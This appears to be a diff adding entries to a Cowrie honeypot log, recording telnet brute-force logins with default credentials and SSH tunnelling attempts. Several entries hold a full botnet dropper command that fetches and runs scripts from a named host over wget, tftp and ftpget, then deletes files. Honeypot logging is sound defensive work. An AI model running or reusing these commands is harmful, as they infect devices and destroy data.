@@ -789,3 +789,69 @@
 2017-05-31T02:15:56+0000 [SSHChannel None (10) on SSHService 'ssh-connection' on HoneyPotSSHTransport,188,91.230.47.69] sending close 10
 2017-05-31T02:15:58+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 31.14.134.125:50129 (10.8.41.81:2223) [session: TT1023]
 2017-05-31T02:15:59+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 31.14.134.125:44917 (10.8.41.81:2223) [session: TT1024]
+2017-05-31T02:16:02+0000 [CowrieTelnetTransport,1023,31.14.134.125] login attempt: 17
+2017-05-31T02:16:02+0000 [CowrieTelnetTransport,1023,31.14.134.125] login return, expect: [root/54321]
+2017-05-31T02:16:03+0000 [CowrieTelnetTransport,1023,31.14.134.125] login attempt [admin/] failed
+2017-05-31T02:16:03+0000 [CowrieTelnetTransport,1023,31.14.134.125] Warning: state changed and new state returned
+2017-05-31T02:16:04+0000 [CowrieTelnetTransport,1024,31.14.134.125] login attempt: 18
+2017-05-31T02:16:04+0000 [CowrieTelnetTransport,1024,31.14.134.125] login return, expect: [root/54321]
+2017-05-31T02:16:06+0000 [CowrieTelnetTransport,1024,31.14.134.125] login attempt [admin/5up] failed
+2017-05-31T02:16:06+0000 [CowrieTelnetTransport,1024,31.14.134.125] Warning: state changed and new state returned
+2017-05-31T02:16:06+0000 [CowrieTelnetTransport,1023,31.14.134.125] login attempt: 19
+2017-05-31T02:16:06+0000 [CowrieTelnetTransport,1023,31.14.134.125] login return, expect: [root/54321]
+2017-05-31T02:16:07+0000 [CowrieTelnetTransport,1023,31.14.134.125] login attempt [enable/shell] failed
+2017-05-31T02:16:07+0000 [CowrieTelnetTransport,1023,31.14.134.125] Warning: state changed and new state returned
+2017-05-31T02:16:08+0000 [CowrieTelnetTransport,1023,31.14.134.125] login attempt: 20
+2017-05-31T02:16:08+0000 [CowrieTelnetTransport,1023,31.14.134.125] login return, expect: [root/54321]
+2017-05-31T02:16:09+0000 [CowrieTelnetTransport,1023,31.14.134.125] login attempt [sh/cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.47/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.165.29.47 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.165.29.47; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.47 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *] failed
+2017-05-31T02:16:09+0000 [CowrieTelnetTransport,1023,31.14.134.125] Warning: state changed and new state returned
+2017-05-31T02:16:09+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 31.14.134.125:41717 (10.8.41.81:2223) [session: TT1025]
+2017-05-31T02:16:09+0000 [CowrieTelnetTransport,1017,31.14.134.125] Closing TTY Log: log/tty/20170531-021358-None-1017i.log after 131 seconds
+2017-05-31T02:16:09+0000 [CowrieTelnetTransport,1017,31.14.134.125] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-05-31T02:16:09+0000 [CowrieTelnetTransport,1017,31.14.134.125] Connection lost after 139 seconds
+2017-05-31T02:16:10+0000 [CowrieTelnetTransport,1024,31.14.134.125] login attempt: 21
+2017-05-31T02:16:10+0000 [CowrieTelnetTransport,1024,31.14.134.125] login return, expect: [root/54321]
+2017-05-31T02:16:11+0000 [CowrieTelnetTransport,1024,31.14.134.125] login attempt [enable/shell] failed
+2017-05-31T02:16:11+0000 [CowrieTelnetTransport,1024,31.14.134.125] Warning: state changed and new state returned
+2017-05-31T02:16:12+0000 [CowrieTelnetTransport,1024,31.14.134.125] login attempt: 22
+2017-05-31T02:16:12+0000 [CowrieTelnetTransport,1024,31.14.134.125] login return, expect: [root/54321]
+2017-05-31T02:16:13+0000 [CowrieTelnetTransport,1024,31.14.134.125] login attempt [sh/cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.47/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.165.29.47 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.165.29.47; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.47 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *] failed
+2017-05-31T02:16:13+0000 [CowrieTelnetTransport,1024,31.14.134.125] Warning: state changed and new state returned
+2017-05-31T02:16:14+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 31.14.134.125:51277 (10.8.41.81:2223) [session: TT1026]
+2017-05-31T02:16:16+0000 [CowrieTelnetTransport,1025,31.14.134.125] login attempt: 23
+2017-05-31T02:16:16+0000 [CowrieTelnetTransport,1025,31.14.134.125] login return, expect: [root/54321]
+2017-05-31T02:16:18+0000 [CowrieTelnetTransport,1025,31.14.134.125] login attempt [Administrator/] failed
+2017-05-31T02:16:18+0000 [CowrieTelnetTransport,1025,31.14.134.125] Warning: state changed and new state returned
+2017-05-31T02:16:18+0000 [CowrieTelnetTransport,1025,31.14.134.125] login attempt: 24
+2017-05-31T02:16:18+0000 [CowrieTelnetTransport,1025,31.14.134.125] login return, expect: [root/54321]
+2017-05-31T02:16:19+0000 [CowrieTelnetTransport,1025,31.14.134.125] login attempt [enable/shell] failed
+2017-05-31T02:16:19+0000 [CowrieTelnetTransport,1025,31.14.134.125] Warning: state changed and new state returned
+2017-05-31T02:16:20+0000 [CowrieTelnetTransport,1025,31.14.134.125] login attempt: 25
+2017-05-31T02:16:20+0000 [CowrieTelnetTransport,1025,31.14.134.125] login return, expect: [root/54321]
+2017-05-31T02:16:21+0000 [CowrieTelnetTransport,1025,31.14.134.125] login attempt [sh/cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.47/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.165.29.47 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.165.29.47; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.47 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *] failed
+2017-05-31T02:16:21+0000 [CowrieTelnetTransport,1025,31.14.134.125] Warning: state changed and new state returned
+2017-05-31T02:16:22+0000 [CowrieTelnetTransport,1026,31.14.134.125] login attempt: 26
+2017-05-31T02:16:22+0000 [CowrieTelnetTransport,1026,31.14.134.125] login return, expect: [root/54321]
+2017-05-31T02:16:23+0000 [CowrieTelnetTransport,1026,31.14.134.125] login attempt [default/] failed
+2017-05-31T02:16:23+0000 [CowrieTelnetTransport,1026,31.14.134.125] Warning: state changed and new state returned
+2017-05-31T02:16:23+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,188,91.230.47.69] got channel 'direct-tcpip' request
+2017-05-31T02:16:23+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,188,91.230.47.69] direct-tcp connection request to 2.18.154.189:443 from localhost:5556
+2017-05-31T02:16:24+0000 [CowrieTelnetTransport,1026,31.14.134.125] login attempt: 27
+2017-05-31T02:16:24+0000 [CowrieTelnetTransport,1026,31.14.134.125] login return, expect: [root/54321]
+2017-05-31T02:16:25+0000 [CowrieTelnetTransport,1026,31.14.134.125] login attempt [enable/shell] failed
+2017-05-31T02:16:25+0000 [CowrieTelnetTransport,1026,31.14.134.125] Warning: state changed and new state returned
+2017-05-31T02:16:26+0000 [CowrieTelnetTransport,1026,31.14.134.125] login attempt: 28
+2017-05-31T02:16:26+0000 [CowrieTelnetTransport,1026,31.14.134.125] login return, expect: [root/54321]
+2017-05-31T02:16:27+0000 [CowrieTelnetTransport,1026,31.14.134.125] login attempt [sh/cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.47/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.165.29.47 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.165.29.47; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.47 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *] failed
+2017-05-31T02:16:27+0000 [CowrieTelnetTransport,1026,31.14.134.125] Warning: state changed and new state returned
+2017-05-31T02:16:27+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,188,91.230.47.69] direct-tcp forward to 2.18.154.189:443 with data '\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x80.\xbb\xc8)\xaez\xe7p\x8d\xf9lk\x85\xe7\xd8\x92\x00\xb4y\xe0\x8b\xd9\xc2\xbeia\x10\xc9\x88^\x06\x0c'
+2017-05-31T02:16:27+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,188,91.230.47.69] failed to connect: Connection refused
+2017-05-31T02:16:27+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,188,91.230.47.69] sending close 11
+2017-05-31T02:16:27+0000 [SSHChannel None (6) on SSHService 'ssh-connection' on HoneyPotSSHTransport,191,91.195.103.184] remote eof
+2017-05-31T02:16:27+0000 [SSHChannel None (6) on SSHService 'ssh-connection' on HoneyPotSSHTransport,191,91.195.103.184] remote close
+2017-05-31T02:16:27+0000 [SSHChannel None (6) on SSHService 'ssh-connection' on HoneyPotSSHTransport,191,91.195.103.184] sending close 6
+2017-05-31T02:16:40+0000 [CowrieTelnetTransport,1023,31.14.134.125] Connection lost after 42 seconds
+2017-05-31T02:16:44+0000 [CowrieTelnetTransport,1024,31.14.134.125] Connection lost after 45 seconds
+2017-05-31T02:16:52+0000 [CowrieTelnetTransport,1025,31.14.134.125] Connection lost after 43 seconds
+2017-05-31T02:16:59+0000 [CowrieTelnetTransport,1026,31.14.134.125] Connection lost after 44 seconds
